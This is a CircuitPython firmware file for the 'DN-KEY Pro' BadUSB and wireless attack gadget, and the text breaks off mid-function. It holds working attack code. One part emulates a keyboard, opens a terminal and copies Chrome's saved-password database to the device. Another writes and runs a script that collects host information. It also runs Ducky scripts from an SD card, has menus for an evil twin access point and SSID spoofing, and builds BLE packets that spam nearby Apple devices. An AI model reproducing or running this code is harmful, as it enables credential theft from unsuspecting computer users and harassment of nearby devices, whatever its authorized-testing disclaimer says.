'''
DN-KEY Pro DC33 Demo

DISCLAIMER:
This software is provided for educational and authorized testing purposes only.
Users are responsible for ensuring they have proper authorization before using
this tool on any system or network. The authors are not responsible for any
misuse or damage caused by this software. Use at your own risk and in
compliance with applicable laws and regulations.

Features:
- HID BadUSB (Ducky Scripts) - Execute scripts from SD card root
- WiFi Attacks (Evil Twin, SSID Spam, Network Scanning)
- Data Exfiltration (Chrome Passwords, System Information)
- BLE Operations (Device Scanning, Apple Spam)
- Web Control Interface (Remote OS control via WiFi)
- Mouse Jiggler
- System Status Monitoring

This DC33 demo includes enhanced data exfiltration capabilities
and integrated web-based remote control interface.

Manifested by 0x0630ff x Made Evil by gh0st
'''

import time
import array
import sys
import supervisor
import usb
import terminalio
import wifi
import socketpool
import ssl
import random

from adafruit_display_text import label

import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode

from adafruit_progressbar.horizontalprogressbar import (
    HorizontalProgressBar,
    HorizontalFillDirection,
)
from rainbowio import colorwheel
# from adafruit_ble import BLERadio

# import local .py files
from dn_key_pro import *

# Color definitions for enhanced UI
NEON_GREEN = 0x00FF00
NEON_PURPLE = 0xFF00FF
NEON_PINK = 0xFF1493
NEON_BLUE = 0x00FFFF
NEON_ORANGE = 0xFF8C00
NEON_RED = 0xFF0000
NEON_DARK = 0x000011
NEON_WHITE = 0xFFFFFF

# Web Controls State
do_mouse_jiggle = False
web_server_running = False
web_server_socket = None
mouse_counter = 0



# Initialize HID devices as None - will be properly initialized in main()
keyboard = None
keyboard_layout = None
mouse = None
consumer_control = None
hid_available = False


# update the current_view variable
def set_current_view(new_view):
    global current_menu
    current_menu = new_view


# Class to implement the Main menu, 
# this inherits from the MenuBase class
class MainMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=0x00F000, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group)
        

# Class to implement the Ducky sctip menu, 
# this inherits from the MenuBase class
class DuckyMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_ {self.title}", color=0x00F000, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# Class for implementing USB Host device
class USBHostMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=0x00F000, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# wifi menu setup
class WiFiMenu(MenuBase):
    def draw(self, group):
        print("drawing wifi main menu")
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=0xF00090, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)
        

# the wifi settings
class WiFiSettingsMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=NEON_PURPLE, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# Data exfiltration menu
class DataMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=NEON_BLUE, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# BLE operations menu
class BLEMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=NEON_PINK, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# Web control menu
class WebMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=NEON_GREEN, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)


# System status menu
class StatusMenu(MenuBase):
    def draw(self, group):
        clear_group()
        text_area = label.Label(terminalio.FONT, text=f"_// {self.title}", color=NEON_WHITE, x=MENU_START_X, y=10, scale=2)
        group.append(text_area)
        self.draw_items(group, offset_x=8)
        print("drawing wifi settings menu")
        # clear_group()
        # todo: add a solid black box over background


# load the wifi settings screen
def load_wifi_settings_screen(user_data=None):
    print("wifi settings")
    time.sleep(0.01)
    wifi_settings = WiFiSettingsMenu("WiFi Settings")
    wifi_settings.draw(display_group) # todo: finish this function
    

# function calls to load when MenuItems are selected.
def load_new_menu(user_data=None):
    print("Loading New Menu")
    print("user_data:", user_data)
    data = f" {user_data}" if user_data != None else ""
    text_area = label.Label(terminalio.FONT, text=f"New Menu Loaded{data}", color=0xF0F0F0, x=10, y=10, scale=2)
    display_group.append(text_area)
    time.sleep(0.01)
    main_menu.draw(display_group)


def start_kbd_read_task(device, text_area):
    usb_host_running = True
    while usb_host_running:
        try:
            available = supervisor.runtime.serial_bytes_available
            if available:
                c = sys.stdin.read(available)
                b = ord(bytes(c.encode()))
                if b == 0x08:  # backspace
                    text_area.text = text_area.text[:-int(len(c))]
                elif b == 0x1B: # escape
                    usb_host_running = False
                    load_usb_host_screen(None)
                else:
                    text_area.text += c
                    # print(c, end="")
        except:
            continue
        # time.sleep(0.01)


def read_usb_host_keyboard(device=None):
    print("reading from usb host as keyboard")
    global usbhost_menu
    clear_group()
    info_text = label.Label(terminalio.FONT, text="[hit escape to end]", color=0xF000F0, x=170, y=10)
    display_group.append(info_text)
    text_area = label.Label(terminalio.FONT, text="", color=0xF0F0FF, x=10, y=20, scale=2)
    display_group.append(text_area)
    start_kbd_read_task(device, text_area)


# function to load and show the USB Host connection
def load_usb_host_screen(user_data=None):
    global usbhost_menu, kbdbuf
    kbdbuf = array.array("B", [0] * 8)
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu)
    ]
    print("Finding usb devices:")
    devices = usb.core.find(find_all=True)
    count = 0
    time.sleep(0.25)
    for device in devices:
        print(f"{device.idVendor:04x}:{device.idProduct:04x}: {device.manufacturer} {device.product}")
        menu_items.append(
            MenuItem(f"Read {device.product}", read_usb_host_keyboard, device)
        )
        count += 1
    if count == 0:
        print("  X No USB devices.")
        menu_items.append(
            MenuItem(f"X No USB Devices", EmptyFunc)
        )
    usbhost_menu = USBHostMenu("USB Host", menu_items)
    usbhost_menu.draw(display_group)
    set_current_view(usbhost_menu)


# function calls to load when MenuItems are selected.
# this one loads the ducky menu view
def load_ducky_menu(user_data=None):
    global ducky_menu
    ducky_menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Load from /SD" if sd_card_init_success else "No SD Card found... :/", load_sd_files),
    ]
    ducky_menu = DuckyMenu("Ducky Script", ducky_menu_items)
    print("trying to load Ducky Menu")
    print("user_data:", user_data)  # show the argument passed to the MenuItem constructor
    ducky_menu.draw(display_group)
    set_current_view(ducky_menu)


# this is the call to run the actual ducky script HID command
# imports are buried here to release from RAM once no longer used.
def run_duck(duck_file):
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)  # We're in the US :)

    # Handle file path - duck_file could be just filename or full path
    if duck_file.startswith("/"):
        full_path = duck_file
    else:
        full_path = f"/{duck_file}"

    border = 8
    x, y = (border, 108)
    pwidth, pheight = (224, 10)

    progress_bar = HorizontalProgressBar(
        (x, y), (pwidth, pheight), direction=HorizontalFillDirection.LEFT_TO_RIGHT
    )

    clear_group()

    text_area = label.Label(terminalio.FONT, text=f"File: \n{full_path}", color=0xF0F0F0, x=0, y=10, scale=2)
    
    display_group.append(text_area)
    display_group.append(progress_bar)

    print("RELEASE THE QUACKING:", full_path)
    duck = Ducky(full_path, keyboard, keyboard_layout)

    result = 0
    while result < 100:
        result = duck.loop()  # send every char from the text file to USB as HID Keyboard
        fresult = result if (progress_bar.value < progress_bar.maximum) else progress_bar.maximum
        progress_bar.value = max(0, min(100, fresult))
        
    print("THE DUCK HAS QUACKED!")
    time.sleep(0.01)
    ducky_menu.draw(display_group)


# sd files loader for Ducky Menu
# Global state for SD file loading
sd_files_loaded = False

def load_sd_files(user_data=None):
    global ducky_menu, sd_files_loaded
    print("Load SD Card files")
    
    if sd_card_init_success:
        # Determine the path to scan (default to root "/")
        filespath = user_data if user_data else "/"
        
        # Handle menu state management - always clear and reset
        ducky_menu.items.clear()
        ducky_menu.items.append(MenuItem("< Back", load_ducky_menu))
        ducky_menu.selected_index = 0
        sd_files_loaded = True
        
        try:
            # List files from the specified directory
            print(f"Attempting to list directory: {filespath}")
            files = os.listdir(filespath)
            print(f"Scanning directory: {filespath}")
            print(f"Found files: {files}")
            
            # Filter for potential Ducky script files and directories
            system_files = {
                "System Volume Information", "RECYCLER", "RECYCLED", 
                "Trash", ".Trashes", ".Spotlight-V100", ".fseventsd",
                "Thumbs.db", "desktop.ini", ".DS_Store"
            }
            
            for file in files:
                if file[0] == ".":  # Skip hidden files
                    continue
                if file in system_files:  # Skip system files
                    continue
                
                # Get file stats to determine if it's a file or directory
                try:
                    stats = os.stat(f"{filespath}/{file}")
                    is_file = (stats[0] >> 15) == 1  # Check if file bit is set
                    
                    if is_file:
                        # It's a file - check if it's a Ducky script
                        if (file.endswith('.txt') or file.endswith('.duck') or 
                            file.endswith('.script') or '.' not in file):
                            full_file_path = f"{filespath}/{file}"
                            ducky_menu.items.append(MenuItem(file, run_duck, full_file_path))
                            print(f"Found Ducky script: {full_file_path}")
                    else:
                        # It's a directory - add as navigable item
                        ducky_menu.items.append(MenuItem(f"{file}/", load_sd_files, f"{filespath}/{file}"))
                        print(f"Found directory: {file}")
                        
                except OSError as e:
                    print(f"Error checking {file}: {e}")
                    continue
            
            # Add back button if we're in a subdirectory
            if filespath != "/":
                ducky_menu.items.insert(0, MenuItem("< Back", load_sd_files, "/"))
            
            ducky_menu.draw(display_group)
            print(f"Loaded {len(files)} items from {filespath}")
                
        except Exception as e:
            print(f"Error loading SD files: {e}")
            print(f"SD card init success: {sd_card_init_success}")
            print(f"Attempted path: {filespath}")
            
            # Try to list root directory to see what's available
            try:
                print("Attempting to list root directory...")
                root_files = os.listdir("/")
                print(f"Root directory contents: {root_files}")
            except Exception as root_error:
                print(f"Error listing root directory: {root_error}")
            
            ducky_menu.items.append(MenuItem("Error loading files", lambda: None))
            ducky_menu.draw(display_group)
    else:
        print("SD CARD NOT INITIALIZED, Check SD Card is present.")


# call to set current view to display
def go_back_to(menu_to_return):
    global display_group
    clear_group()
    menu_to_return.draw(display_group)
    set_current_view(menu_to_return)


def back_menu_item(back_to_menu):
    return MenuItem("< Back", go_back_to, back_to_menu),


def load_wifi_menu_screen(user_data=None):
    global wifi_menu, main_menu
    print("load wifi menu screen")
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Scan Networks", scan_wifi_networks),
        MenuItem("Start Evil AP", start_evil_twin_ap),
        MenuItem("Stop Evil AP", stop_evil_twin_ap),
        MenuItem("SSID Spoofer", start_ssid_spam),
        MenuItem("WiFi Status", show_wifi_status),
    ]
    wifi_menu = WiFiMenu("WiFi Attacks", menu_items)
    wifi_menu.draw(display_group)
    set_current_view(wifi_menu)


# function to check for SD card and show contents
def scan_sd_card(user_data=None):
    print("trying to scan SD Card")
    clear_group()
    

def load_sd_card_menu_screen(user_data=None):
    print("load sd card menu screen")
    clear_group()


def load_data_menu_screen(user_data=None):
    """Load data exfiltration menu"""
    global data_menu, main_menu
    print("Loading data exfiltration menu")
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Chrome Passwords", dump_chrome_data),
        MenuItem("System Info", get_system_info),
        MenuItem("Keylogger", toggle_keylogger),
    ]
    data_menu = DataMenu("Data Exfiltration", menu_items)
    data_menu.draw(display_group)
    set_current_view(data_menu)


def load_ble_menu_screen(user_data=None):
    """Load BLE operations menu"""
    global ble_menu, main_menu
    print("Loading BLE operations menu")
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Scan Devices", start_ble_scan),
        MenuItem("Start Apple Spam", start_apple_spam),
        MenuItem("Stop Apple Spam", stop_apple_spam),
    ]
    ble_menu = BLEMenu("BLE Operations", menu_items)
    ble_menu.draw(display_group)
    set_current_view(ble_menu)


def load_web_menu_screen(user_data=None):
    """Load web control menu"""
    global web_menu, main_menu
    print("Loading web control menu")
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Start Web Server", start_web_server),
        MenuItem("Stop Web Server", stop_web_server),
    ]
    web_menu = WebMenu("Web Control", menu_items)
    web_menu.draw(display_group)
    set_current_view(web_menu)


def load_status_screen(user_data=None):
    """Load system status screen"""
    global status_menu, main_menu
    print("Loading system status screen")
    menu_items = [
        MenuItem("< Back", go_back_to, main_menu),
        MenuItem("Refresh", refresh_status),
        MenuItem("Test Display", test_display),
        MenuItem("Test LEDs", test_leds),
    ]
    status_menu = StatusMenu("System Status", menu_items)
    status_menu.draw(display_group)
    set_current_view(status_menu)


# Data exfiltration functions
def dump_chrome_data(user_data=None):
    global data_menu
    """Dump Chrome browser passwords and data"""
    print("Dumping Chrome passwords...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="Chrome Password Dump", color=NEON_BLUE, x=10, y=20, scale=2)
    display_group.append(text_area)
    
    status_text = label.Label(terminalio.FONT, text="Opening terminal...", color=NEON_WHITE, x=10, y=50, scale=1)
    display_group.append(status_text)
    time.sleep(1)
    
    # Execute Chrome password dump script via HID
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    
    try:
        # Open terminal (works on both macOS and Linux)
        keyboard.press(Keycode.GUI, Keycode.SPACE)  # macOS Spotlight or Linux Super key
        keyboard.release_all()
        time.sleep(0.5)
        keyboard_layout.write("terminal")
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(2)
        
        status_text.text = "Executing dump script..."
        
        # Robust Chrome password dump script
        script_lines = [
            "echo 'DN-KEY Chrome Password Exfiltration'",
            "if [ -f ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ]; then",
            "    cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /Volumes/DN_KEY_PY/chrome_passwords.db",
            "    echo 'Chrome passwords copied!'",
            "elif [ -f ~/.config/google-chrome/Default/Login\\ Data ]; then",
            "    cp ~/.config/google-chrome/Default/Login\\ Data /Volumes/DN_KEY_PY/chrome_passwords.db",
            "    echo 'Chrome passwords copied!'",
            "else",
            "    echo 'Chrome Login Data not found'",
            "fi"
        ]
        
        # Type the script
        for line in script_lines:
            keyboard_layout.write(line)
            keyboard.press(Keycode.ENTER)
            keyboard.release_all()
            time.sleep(0.1)
        
        status_text.text = "Script executed! Check drive..."
        time.sleep(5)
        
    except Exception as e:
        print(f"Error during Chrome dump: {e}")
        status_text.text = "Error executing dump script"
        time.sleep(2)
    
    data_menu.draw(display_group)
    set_current_view(data_menu)





def get_system_info(user_data=None):
    """Get comprehensive system information and save to file"""
    global data_menu
    print("Getting system info...")
    clear_group()
    text_area = label.Label(terminalio.FONT, text="System Information", color=NEON_GREEN, x=10, y=20, scale=2)
    display_group.append(text_area)
    
    status_text = label.Label(terminalio.FONT, text="Opening terminal...", color=NEON_WHITE, x=10, y=50, scale=1)
    display_group.append(status_text)
    time.sleep(1)
    
    # Execute system info script via HID
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    
    try:
        # Open terminal
        keyboard.press(Keycode.GUI, Keycode.SPACE)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard_layout.write("terminal")
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(2)
        
        status_text.text = "Collecting system info..."
        
        # Create and execute system info script
        script_lines = [
            "echo 'DN-KEY System Info'",
            "cat > /tmp/dnkey_sysinfo.sh << 'EOF'",
            "#!/bin/bash",
            "echo '=== DN-KEY System Information ==='",
            "echo 'Date: '$(date)",
            "echo 'Hostname: '$(hostname)",
            "echo 'User: '$(whoami)",
            "echo 'OS: '$(sw_vers -productName)' '$(sw_vers -productVersion)",
            "echo 'Architecture: '$(uname -m)",
            "echo 'Kernel: '$(uname -r)",
            "echo 'Uptime: '$(uptime)",
            "echo 'Disk Usage:'",
            "df -h / | tail -1",
            "echo 'Memory:'",
            "vm_stat | head -5",
            "echo 'Network Interfaces:'",
            "ifconfig | grep -E '^[a-z]' | awk '{print $1}'",
            "EOF",
            "chmod +x /tmp/dnkey_sysinfo.sh",
            "/tmp/dnkey_sysinfo.sh > /Volumes/DN_KEY_PY/system_info.txt",
            "echo 'System info saved!'"
        ]
        
        # Type the script
        for line in script_lines:
            keyboard_layout.write(line)
            keyboard.press(Keycode.ENTER)
            keyboard.release_all()
            time.sleep(0.1)
        
        status_text.text = "System info collected! Check drive..."
        time.sleep(5)
        
    except Exception as e:
        print(f"Error during system info collection: {e}")
        status_text.text = "Error collecting system info"
        time.sleep(2)
    
    data_menu.draw(display_group)
    set_current_view(data_menu)


def toggle_keylogger(user_data=None):
    """Keylogger feature coming soon..."""
    print("Keylogger feature coming soon...")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Keylogger", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    status_text = "Feature coming soon..."
    status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_WHITE, x=10, y=40, scale=1)
    display_group.append(status_label)
    
    time.sleep(3)
    data_menu.draw(display_group)
    set_current_view(data_menu)





def do_ble_scan():
    ble = BLERadio()
    print("scanning")
    found = set()
    scan_responses = set()
    for advertisement in ble.start_scan(extended=True,timeout=10):
        addr = advertisement.address
        if advertisement.scan_response and addr not in scan_responses:
            scan_responses.add(addr)
        elif not advertisement.scan_response and addr not in found:
            found.add(addr)
        else:
            continue
        # print(addr, advertisement)
        # print("\t" + repr(advertisement))
        # print()
    return found, scan_responses


# BLE functions
def start_ble_scan(user_data=None):
    import _bleio
    global ble_menu
    """Start BLE device scanning"""
    print("=== BLE Device Scan ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="BLE Device Scan", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    try:
        status_text = "Scanning for BLE devices...\n"
        status_label = label.Label(terminalio.FONT, text=status_text, color=NEON_WHITE, x=10, y=40, scale=1)
        display_group.append(status_label)
        
        # Use existing BLE adapter
        _bleio.adapter.enabled = True
        
        print("BLE adapter enabled, starting scan...")
        
        # Scan for devices
        scan_entries = _bleio.adapter.start_scan(extended=True,timeout=10,minimum_rssi=-80)

        scan_timestamp = time.monotonic()

        # Collect devices
        devices = []
        scan_time = 0
        max_scan_time = 10  # Scan for 10 seconds

        while (time.monotonic() - scan_timestamp) < (10):
            print(time.monotonic() - scan_timestamp)
            # print(".", end="")
            status_label.text += "."
            time.sleep(0.5)
        # print(".")
        
        for scan_entry in scan_entries:
            # Get device info
            address = scan_entry.address
            rssi = scan_entry.rssi
            
            device_name = "None"
            addr_bytes = address.address_bytes
            # Format address
            addr_str = ":".join([f"{b:02x}" for b in addr_bytes])
            devices.append((device_name, addr_str, rssi))

            devices.append((device_name, addr_str, rssi))

        # Show results
        clear_group()
        display_group.append(title_text)
        
        if devices:
            found_text = f"Found {len(devices)} BLE devices"
            found_label = label.Label(terminalio.FONT, text=found_text, color=NEON_GREEN, x=10, y=40, scale=1)
            display_group.append(found_label)
            print(found_text)
            # Show first few devices
            y_pos = 50
            for i, (name, addr, rssi) in enumerate(devices[:8]):
                device_text = f"{name[:12]} ({rssi}dB)"
                device_label = label.Label(terminalio.FONT, text=device_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
                display_group.append(device_label)
                y_pos += 10
                
                addr_text = f"  {addr[:17]}..."
                addr_label = label.Label(terminalio.FONT, text=addr_text, color=NEON_BLUE, x=10, y=y_pos, scale=1)
                display_group.append(addr_label)
                y_pos += 10
            
            if len(devices) > 8:
                more_text = f"... and {len(devices) - 8} more devices"
                more_label = label.Label(terminalio.FONT, text=more_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
                display_group.append(more_label)
        else:
            no_devices_text = "No BLE devices found"
            no_devices_label = label.Label(terminalio.FONT, text=no_devices_text, color=NEON_PINK, x=10, y=50, scale=1)
            display_group.append(no_devices_label)
        
        print(f"BLE scan completed, found {len(devices)} devices")
        
    except ImportError:
        # Fallback: Show simulated BLE scan for demo
        error_text = "Using simulated BLE scan"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_ORANGE, x=10, y=50, scale=1)
        display_group.append(error_label)
        
        info_text = "BLE library not available"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(info_label)
        
        # Show simulated devices for demo
        time.sleep(2)
        clear_group()
        display_group.append(title_text)
        
        sim_text = "Simulated BLE Devices"
        sim_label = label.Label(terminalio.FONT, text=sim_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(sim_label)
        
        # Common BLE devices
        sim_devices = [
            ("iPhone 15", "12:34:56:78:9a:bc", -45),
            ("AirPods Pro", "34:56:78:9a:bc:de", -52),
            ("Apple Watch", "56:78:9a:bc:de:f0", -58),
            ("Samsung Galaxy", "78:9a:bc:de:f0:12", -62),
            ("Fitbit", "9a:bc:de:f0:12:34", -68),
            ("Bluetooth Speaker", "bc:de:f0:12:34:56", -72),
        ]
        
        y_pos = 70
        for name, addr, rssi in sim_devices:
            device_text = f"{name} ({rssi}dB)"
            device_label = label.Label(terminalio.FONT, text=device_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
            display_group.append(device_label)
            y_pos += 15
            
            addr_text = f"  {addr}"
            addr_label = label.Label(terminalio.FONT, text=addr_text, color=NEON_BLUE, x=10, y=y_pos, scale=1)
            display_group.append(addr_label)
            y_pos += 15
        
        demo_text = "Demo mode - simulated results"
        demo_label = label.Label(terminalio.FONT, text=demo_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
        display_group.append(demo_label)
        
        print("Using simulated BLE scan for demo")
        
    except Exception as e:
        error_text = f"BLE scan error: {str(e)[:25]}"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=60, scale=1)
        display_group.append(error_label)
        print(f"BLE scan error: {e}")
    
    # Show for 5 seconds then return
    time.sleep(5)
    ble_menu.draw(display_group)
    set_current_view(ble_menu)


# Global variable to track Apple spam state
apple_spam_active = False
apple_spam_count = 0
apple_spam_last_time = 0

def run_apple_spam_background():
    """Run Apple spam in background - called from main loop"""
    global apple_spam_active, apple_spam_count, apple_spam_last_time
    
    if not apple_spam_active:
        return
    
    try:
        import _bleio
        import random
        import struct
        
        # Only run every 0.2 seconds to avoid blocking and MAC address issues
        current_time = time.monotonic()
        if current_time - apple_spam_last_time < 0.2:
            return
        
        apple_spam_last_time = current_time
        
        # Proven Apple Sour packet structure (from ESP32 example)
        def create_apple_sour_packet():
            # Packet structure based on the proven ESP32 implementation
            packet = bytearray(17)
            i = 0
            
            packet[i] = 17 - 1  # Packet Length
            i += 1
            packet[i] = 0xFF    # Packet Type (Manufacturer Specific)
            i += 1
            packet[i] = 0x4C    # Packet Company ID (Apple, Inc.)
            i += 1
            packet[i] = 0x00    # ...
            i += 1
            packet[i] = 0x0F    # Type
            i += 1
            packet[i] = 0x05    # Length
            i += 1
            packet[i] = 0xC1    # Action Flags
            i += 1
            
            # Action Type (random from proven types)
            types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
            packet[i] = random.choice(types)
            i += 1
            
            # Authentication Tag (random)
            for _ in range(3):
                packet[i] = random.randint(0, 255)
                i += 1
            
            packet[i] = 0x00    # ???
            i += 1
            packet[i] = 0x00    # ???
            i += 1
            packet[i] = 0x10    # Type ???
            i += 1
            
            # Final random bytes
            for _ in range(3):
                packet[i] = random.randint(0, 255)
                i += 1
            
            return bytes(packet)
        
        # MAC spoofing removed - using default address for stability
        # The Apple Sour packets are effective without MAC spoofing
        
        # Send 1-2 packets per cycle (non-blocking)
        for _ in range(1):
            if not apple_spam_active:
                break
            try:
                pkt = create_apple_sour_packet()
                _bleio.adapter.stop_advertising()
                _bleio.adapter.start_advertising(pkt, connectable=False, interval=0.05, tx_power=99)
                # Don't sleep here - let main loop handle timing
            except Exception as e:
                print(f"Background spam error: {e}")
                continue
        
        apple_spam_count += 1
        
        # Print progress every 25 packets
        if apple_spam_count % 25 == 0:
            print(f"Background Apple spam: {apple_spam_count} packets sent")
        
    except Exception as e:
        print(f"Background Apple spam error: {e}")
        # Don't stop spam on error, just continue
        pass


def start_apple_spam(user_data=None):
    """Start Apple device spam - non-blocking background operation"""
    global apple_spam_active
    
    print("=== Apple Device Spam ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Apple Device Spam", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    try:
        # Try to import BLE modules
        import _bleio
        import random
        import struct
        
        # Use existing BLE adapter
        _bleio.adapter.enabled = True
        
        # Set spam as active
        apple_spam_active = True
        
        # Show spam info
        info_text = "Apple Spam Started!"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(info_label)
        
        # Show device list
        apple_devices = [
            "iPhone 15 Pro", "iPhone 14", "iPad Pro", 
            "MacBook Air", "Apple Watch", "AirPods Pro"
        ]
        
        y_pos = 70
        for i, device in enumerate(apple_devices[:4]):
            device_text = f"• {device}"
            device_label = label.Label(terminalio.FONT, text=device_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
            display_group.append(device_label)
            y_pos += 15
        
        more_text = "... and more Apple devices"
        more_label = label.Label(terminalio.FONT, text=more_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
        display_group.append(more_label)
        
        # Add instruction to stop
        stop_text = "Select 'Stop Apple Spam' to stop"
        stop_label = label.Label(terminalio.FONT, text=stop_text, color=NEON_PINK, x=10, y=y_pos + 20, scale=1)
        display_group.append(stop_label)
        
        # Show for 3 seconds then return to menu
        time.sleep(3)
        
        # Return to BLE menu - spam will run in background via main loop
        load_ble_menu_screen()
        
        print("Apple spam started in background")
        
    except ImportError:
        # Fallback: Show simulated Apple spam for demo
        error_text = "Using simulated Apple spam"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_ORANGE, x=10, y=50, scale=1)
        display_group.append(error_label)
        
        info_text = "BLE library not available"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(info_label)
        
        # Show simulated Apple spam for demo
        time.sleep(2)
        clear_group()
        display_group.append(title_text)
        
        sim_text = "Simulated Apple Spam"
        sim_label = label.Label(terminalio.FONT, text=sim_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(sim_label)
        
        # Simulate Apple device spam
        apple_devices = [
            "iPhone 15 Pro",
            "iPhone 14",
            "iPad Pro",
            "MacBook Air",
            "Apple Watch",
            "AirPods Pro",
            "iMac",
            "Mac Mini",
            "Apple TV",
            "HomePod"
        ]
        
        y_pos = 70
        for i, device in enumerate(apple_devices[:5]):
            device_text = f"• {device}"
            device_label = label.Label(terminalio.FONT, text=device_text, color=NEON_WHITE, x=10, y=y_pos, scale=1)
            display_group.append(device_label)
            y_pos += 15
        
        more_text = "... and more Apple devices"
        more_label = label.Label(terminalio.FONT, text=more_text, color=NEON_ORANGE, x=10, y=y_pos, scale=1)
        display_group.append(more_label)
        
        # Simulate spam progress
        for i in range(5):
            current_text = f"Spamming: {apple_devices[i]}"
            current_label = label.Label(terminalio.FONT, text=current_text, color=NEON_GREEN, x=10, y=110, scale=1)
            display_group.append(current_label)
            
            progress_text = f"Packet {i+1}/5"
            progress_label = label.Label(terminalio.FONT, text=progress_text, color=NEON_BLUE, x=10, y=130, scale=1)
            display_group.append(progress_label)
            
            time.sleep(1)
            
            # Remove progress labels
            if len(display_group) > 7:
                display_group.pop()
                display_group.pop()
        
        # Show completion
        clear_group()
        display_group.append(title_text)
        
        complete_text = "Apple Spam Complete!"
        complete_label = label.Label(terminalio.FONT, text=complete_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(complete_label)
        
        sent_text = "Sent 5 Apple packets (demo)"
        sent_label = label.Label(terminalio.FONT, text=sent_text, color=NEON_WHITE, x=10, y=70, scale=1)
        display_group.append(sent_label)
        
        info_text = "Demo mode - simulated results"
        info_label = label.Label(terminalio.FONT, text=info_text, color=NEON_ORANGE, x=10, y=90, scale=1)
        display_group.append(info_label)
        
        print("Using simulated Apple spam for demo")
        
    except Exception as e:
        error_text = f"Apple spam error: {str(e)[:25]}"
        error_label = label.Label(terminalio.FONT, text=error_text, color=NEON_PINK, x=10, y=50, scale=1)
        display_group.append(error_label)
        print(f"Apple spam error: {e}")
    
    print("Apple spam setup completed")


def stop_apple_spam(user_data=None):
    """Stop Apple device spam"""
    global apple_spam_active, apple_spam_count
    
    print("=== Stop Apple Spam ===")
    clear_group()
    
    title_text = label.Label(terminalio.FONT, text="Stop Apple Spam", color=NEON_PURPLE, x=10, y=20, scale=2)
    display_group.append(title_text)
    
    if apple_spam_active:
        # Stop the spam
        apple_spam_active = False
        
        try:
            import _bleio
            _bleio.adapter.stop_advertising()
        except:
            pass
        
        success_text = "Apple Spam Stopped!"
        success_label = label.Label(terminalio.FONT, text=success_text, color=NEON_GREEN, x=10, y=50, scale=1)
        display_group.append(success_label)
        
        info_text = f"Sent {apple_spam_count} packets total"
